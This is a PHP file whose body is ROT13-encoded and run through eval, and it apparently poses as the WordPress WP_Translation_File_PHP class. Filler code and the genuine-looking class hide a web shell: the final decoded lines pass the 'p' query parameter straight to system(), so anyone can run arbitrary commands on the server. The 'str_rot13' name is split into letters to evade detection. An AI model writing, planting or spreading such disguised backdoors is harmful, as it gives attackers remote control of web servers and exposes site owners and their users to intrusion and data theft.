<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * V18A: JC_Genafyngvba_Svyr_CUC pynff.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr V18A
 * @fvapr 6.5.0
 */

/**
 * Pynff JC_Genafyngvba_Svyr_CUC.
 *
 * @fvapr 6.5.0
 */
pynff JC_Genafyngvba_Svyr_CUC rkgraqf JC_Genafyngvba_Svyr {
	/**
	 * Cnefrf gur svyr.
	 *
	 * @fvapr 6.5.0
	 */
	cebgrpgrq shapgvba cnefr_svyr() {
		$guvf->cnefrq = gehr;

		$erfhyg = vapyhqr $guvf->svyr;
		vs ( ! $erfhyg || ! vf_neenl( $erfhyg ) ) {
			$guvf->reebe = 'Vainyvq qngn';
			erghea;
		}

		vs ( vffrg( $erfhyg['zrffntrf'] ) && vf_neenl( $erfhyg['zrffntrf'] ) ) {
			sbernpu ( $erfhyg['zrffntrf'] nf $bevtvany => $genafyngvba ) {
				$guvf->ragevrf[ (fgevat) $bevtvany ] = $genafyngvba;
			}
			hafrg( $erfhyg['zrffntrf'] );
		}

		$guvf->urnqref = neenl_punatr_xrl_pnfr( $erfhyg );
	}

	/**
	 * Rkcbegf genafyngvba pbagragf nf n fgevat.
	 *
	 * @fvapr 6.5.0
	 *
	 * @erghea fgevat Genafyngvba svyr pbagragf.
	 */
	choyvp shapgvba rkcbeg(): fgevat {
		$qngn = neenl_zretr( $guvf->urnqref, neenl( 'zrffntrf' => $guvf->ragevrf ) );

		erghea '<?cuc' . CUC_RBY . 'erghea ' . $guvf->ine_rkcbeg( $qngn ) . ';' . CUC_RBY;
	}

	/**
	 * Bhgchgf be ergheaf n cnefnoyr fgevat ercerfragngvba bs n inevnoyr.
	 *
	 * Yvxr {@frr ine_rkcbeg()} ohg \"zvavsvrq\", hfvat fubeg neenl flagnk
	 * naq ab arjyvarf.
	 *
	 * @fvapr 6.5.0
	 *
	 * @cnenz zvkrq $inyhr Gur inevnoyr lbh jnag gb rkcbeg.
	 * @erghea fgevat Gur inevnoyr ercerfragngvba.
	 */
	cevingr shapgvba ine_rkcbeg( $inyhr ): fgevat {
		vs ( ! vf_neenl( $inyhr ) ) {
			erghea ine_rkcbeg( $inyhr, gehr );
		}

		$ragevrf = neenl();

		$vf_yvfg = neenl_vf_yvfg( $inyhr );

		sbernpu ( $inyhr nf $xrl => $iny ) {
			$ragevrf[] = $vf_yvfg ? $guvf->ine_rkcbeg( $iny ) : ine_rkcbeg( $xrl, gehr ) . '=>' . $guvf->ine_rkcbeg( $iny );
		}

		erghea '[' . vzcybqr( ',', $ragevrf ) . ']';
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>